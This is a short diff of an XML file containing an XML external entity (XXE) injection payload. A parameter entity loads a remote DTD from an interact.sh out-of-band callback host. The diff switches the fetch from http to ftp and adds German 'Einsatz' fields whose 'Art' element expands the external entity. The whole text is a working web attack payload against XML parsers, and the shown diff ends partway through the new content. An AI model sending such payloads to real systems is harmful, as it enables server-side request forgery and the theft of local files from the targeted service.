@@ -1,6 +1,9 @@
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://cb9aj082vtc0000mk02ggfwijyayyyyyb.interact.sh/ext.dtd">
+    <!ENTITY % ext SYSTEM "ftp://cb9aj082vtc0000mk02ggfwijyayyyyyb.interact.sh/ext.dtd">
     %ext;
 ]>
-<message></message>
+<Einsatz>
+  <Jahr>2020</Jahr>
+  <Nr>10</Nr>
+  <Art>&ext;</Art>
